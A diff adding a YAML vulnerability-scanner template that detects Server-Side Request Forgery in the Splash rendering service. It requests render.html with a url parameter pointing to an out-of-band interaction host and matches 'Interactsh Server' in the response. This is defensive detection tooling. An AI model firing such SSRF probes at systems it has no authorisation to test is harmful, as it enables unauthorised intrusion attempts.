@@ -1,0 +1,25 @@
+id: splash-render-ssrf
+brief:
+    title: Splash Render - SSRF
+    by: pwnhxl
+    level: high
+    about: Splash Render is vulnerable to Server-Side Request Forgery (SSRF) Vulnerability.
+    label:
+        - splash
+        - ssrf
+        - oast
+        - oss
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/render.html?url=https://oast.live'
+      signs:
+        - "on": word
+          has:
+            - Interactsh Server
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
